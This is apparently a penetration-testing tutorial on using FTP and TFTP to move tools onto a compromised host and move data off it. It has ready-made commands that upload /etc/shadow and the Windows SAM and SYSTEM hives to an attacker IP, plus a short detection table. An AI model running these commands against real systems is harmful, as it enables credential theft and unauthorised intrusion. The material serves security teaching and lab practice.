# 📡 FTP & TFTP File Transfer in Ethical Hacking

## 📖 What Are FTP and TFTP?

**FTP (File Transfer Protocol)** and **TFTP (Trivial File Transfer Protocol)** are classic network protocols designed specifically for file transfer.

| Feature | FTP | TFTP |
| --- | --- | --- |
| Port | 21 (control) + 20 (data) | 69 |
| Protocol | TCP | UDP |
| Authentication | Username + password | None |
| Encryption | ❌ No (use FTPS/SFTP for encryption) | ❌ No |
| Complexity | Full-featured | Minimal |
| Use in hacking | Common — good fallback | Rare — very limited |

```text
  ATTACKER                                    TARGET
  ┌──────────────┐                           ┌──────────────┐
  │  FTP Server  │  Port 21 (TCP)            │  FTP Client  │
  │  (pyftpdlib  │ ◀──────────────────────── │  (ftp.exe    │
  │   or vsftpd) │  Login + Download/Upload  │   built-in)  │
  └──────────────┘                           └──────────────┘

  ┌──────────────┐                           ┌──────────────┐
  │  TFTP Server │  Port 69 (UDP)            │  TFTP Client │
  │  (atftpd)    │ ◀──────────────────────── │  (tftp.exe   │
  │              │  No auth + Get/Put        │   built-in)  │
  └──────────────┘                           └──────────────┘
```

---

# 📂 FTP File Transfer

---

## 🛠 Setting Up FTP Server (Attacker Side)

### Method 1: Python pyftpdlib (Quick & Easy)

```bash
# Install
pip install pyftpdlib

# Start anonymous FTP server (read-only)
python3 -m pyftpdlib -p 21

# Start with write access (allows uploads)
python3 -m pyftpdlib -p 21 --write

# Start with username/password
python3 -m pyftpdlib -p 21 --user=hacker --password=hacker123 --write
```

**Output:**

```text
[I] Serving FTP on 0.0.0.0:21
[I] Anonymous login allowed (read-only)
```

---

### Method 2: vsftpd (Linux Native)

```bash
# Install
sudo apt install vsftpd

# Configure
sudo nano /etc/vsftpd.conf
```

Basic config:

```ini
anonymous_enable=YES
local_enable=YES
write_enable=YES
anon_upload_enable=YES
anon_mkdir_write_enable=YES
```

```bash
# Put files in FTP directory
sudo cp tools/* /srv/ftp/

# Start
sudo systemctl start vsftpd
```

---

## 📥 Downloading Files via FTP (Target Side)

### Windows — Interactive FTP Client

Windows has **ftp.exe** built-in:

```cmd
:: Start FTP client
ftp 10.10.14.5

:: Login
Name: anonymous
Password: (press Enter)

:: Switch to binary mode (IMPORTANT for executables!)
binary

:: Download file
get mimikatz.exe

:: Download multiple files
mget *.exe

:: Upload file
put C:\Temp\loot.txt

:: Exit
bye
```

### Windows — Non-Interactive (Scripted) FTP

Create a script file for automated transfer:

```cmd
:: Create FTP script
echo open 10.10.14.5 > ftp_commands.txt
echo USER anonymous >> ftp_commands.txt
echo PASS >> ftp_commands.txt
echo binary >> ftp_commands.txt
echo GET mimikatz.exe >> ftp_commands.txt
echo bye >> ftp_commands.txt

:: Execute script
ftp -s:ftp_commands.txt
```

> Very useful when you only have cmd.exe access and can't do interactive sessions.

### Linux — FTP Client

```bash
# Connect
ftp 10.10.14.5

# Commands
binary
get linpeas.sh
put /etc/shadow
bye
```

### Linux — wget via FTP

```bash
# Download from FTP using wget
wget ftp://10.10.14.5/linpeas.sh

# Download with credentials
wget ftp://hacker:hacker123@10.10.14.5/tool.sh
```

### Linux — curl via FTP

```bash
# Download
curl ftp://10.10.14.5/linpeas.sh -o linpeas.sh

# Upload
curl -T /etc/shadow ftp://10.10.14.5/ --user hacker:hacker123
```

### PowerShell FTP

```powershell
# Download via PowerShell
(New-Object Net.WebClient).DownloadFile('ftp://10.10.14.5/tool.exe', 'C:\Temp\tool.exe')

# Upload via PowerShell
(New-Object Net.WebClient).UploadFile('ftp://10.10.14.5/loot.txt', 'C:\Temp\loot.txt')
```

---

## 📤 Uploading Files to FTP (Target → Attacker)

**Attacker — Start with write access:**

```bash
python3 -m pyftpdlib -p 21 --write
```

**Target (Windows — cmd.exe):**

```cmd
:: Create upload script
echo open 10.10.14.5 > upload.txt
echo USER anonymous >> upload.txt
echo PASS >> upload.txt
echo binary >> upload.txt
echo PUT C:\Temp\SAM >> upload.txt
echo PUT C:\Temp\SYSTEM >> upload.txt
echo bye >> upload.txt

:: Run
ftp -s:upload.txt
```

**Target (Linux):**

```bash
curl -T /etc/shadow ftp://10.10.14.5/
```

---

# 📡 TFTP File Transfer

TFTP is **simpler** than FTP — no authentication, no directory listing. Just GET and PUT.

---

## 🛠 Setting Up TFTP Server (Attacker Side)

### Method 1: atftpd

```bash
# Install
sudo apt install atftpd

# Create TFTP directory
sudo mkdir /tftp
sudo chmod 777 /tftp

# Copy files
sudo cp tools/* /tftp/

# Start TFTP server
sudo atftpd --daemon --no-fork --logfile - --port 69 /tftp
```

### Method 2: Python tftpy

```bash
pip install tftpy

python3 -c "
import tftpy
server = tftpy.TftpServer('/tmp/tftp')
server.listen('0.0.0.0', 69)
"
```

---

## 📥 Using TFTP (Target Side)

### Windows (tftp.exe — Built-in!)

```cmd
:: Download file
tftp -i 10.10.14.5 GET mimikatz.exe

:: Upload file
tftp -i 10.10.14.5 PUT C:\Temp\SAM
```

> ⚠ **TFTP client is disabled by default on Windows 10.** It works on older Windows and servers.

### Enable TFTP on Windows

```cmd
:: Enable TFTP client feature
dism /online /Enable-Feature /FeatureName:TFTP
```

### Linux

```bash
# Download
tftp 10.10.14.5 -c get linpeas.sh

# Upload
tftp 10.10.14.5 -c put /etc/shadow
```

---

## 🔥 Realistic Scenarios

---

### Scenario 1: Old Windows Server — Only FTP Available

```text
SITUATION: Windows Server 2008, PowerShell restricted, no outbound HTTP

ATTACKER:
┌──────────────────────────────────────────────┐
│ cd /opt/tools                                │
│ python3 -m pyftpdlib -p 21                   │
└──────────────────────────────────────────────┘

TARGET (cmd.exe only):
┌──────────────────────────────────────────────┐
│ echo open 10.10.14.5 > dl.txt                │
│ echo USER anonymous >> dl.txt                │
│ echo PASS >> dl.txt                          │
│ echo binary >> dl.txt                        │
│ echo GET winpeas.exe >> dl.txt               │
│ echo bye >> dl.txt                           │
│ ftp -s:dl.txt                                │
│                                              │
│ winpeas.exe                                  │
└──────────────────────────────────────────────┘
```

---

### Scenario 2: Exfiltrate Data via FTP Upload

```text
ATTACKER:
┌──────────────────────────────────────────────┐
│ python3 -m pyftpdlib -p 21 --write           │
└──────────────────────────────────────────────┘

TARGET:
┌──────────────────────────────────────────────┐
│ # Save registry hives                        │
│ reg save HKLM\SAM C:\Temp\SAM               │
│ reg save HKLM\SYSTEM C:\Temp\SYSTEM         │
│                                              │
│ # Upload via FTP                             │
│ echo open 10.10.14.5 > up.txt                │
│ echo USER anonymous >> up.txt                │
│ echo PASS >> up.txt                          │
│ echo binary >> up.txt                        │
│ echo PUT C:\Temp\SAM >> up.txt               │
│ echo PUT C:\Temp\SYSTEM >> up.txt            │
│ echo bye >> up.txt                           │
│ ftp -s:up.txt                                │
└──────────────────────────────────────────────┘

ATTACKER:
┌──────────────────────────────────────────────┐
│ secretsdump.py -sam SAM -system SYSTEM LOCAL │
└──────────────────────────────────────────────┘
```

---

## 📊 FTP vs TFTP Comparison

| Feature | FTP | TFTP |
| --- | --- | --- |
| Port | 21 (TCP) | 69 (UDP) |
| Authentication | ✅ Username/password | ❌ None |
| Directory listing | ✅ Yes | ❌ No |
| Upload | ✅ Yes | ✅ Yes |
| Download | ✅ Yes | ✅ Yes |
| Built-in Windows | ✅ ftp.exe | ⚠ Sometimes disabled |
| Server ease | ⭐⭐ Easy | ⭐ Easy |
| Common in pentesting | ✅ Moderate | ❌ Rare |

---

## 🛡 Blue Team — Detection

| Protocol | What to Monitor |
| --- | --- |
| FTP (port 21) | Outbound FTP connections to unknown IPs |
| TFTP (port 69) | Any TFTP traffic (very unusual in modern networks) |
| ftp.exe usage | Process creation monitoring |
| FTP script files | Look for `ftp -s:` command patterns |

---

## ⚠ Ethical Reminder

* ✅ Only use on systems with **written authorization**
* ✅ Practice in your own lab
* ❌ Never exfiltrate real data without permission
